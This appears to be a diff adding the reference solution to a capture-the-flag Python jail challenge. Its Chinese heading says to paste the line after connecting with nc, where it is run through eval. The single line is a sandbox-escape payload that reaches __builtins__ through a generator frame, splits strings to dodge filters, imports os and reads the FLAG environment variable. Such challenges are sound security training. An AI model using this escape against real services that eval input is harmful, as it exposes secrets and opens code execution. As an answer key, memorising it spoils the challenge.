@@ -1,0 +1,3 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+getattr(getattr(getattr(getattr((x for x in [1]), 'gi_frame'), 'f_globals')['__bu'+'iltins__'], '__i'+'mport__')('o'+'s'), 'envi'+'ron')['F'+'LAG']
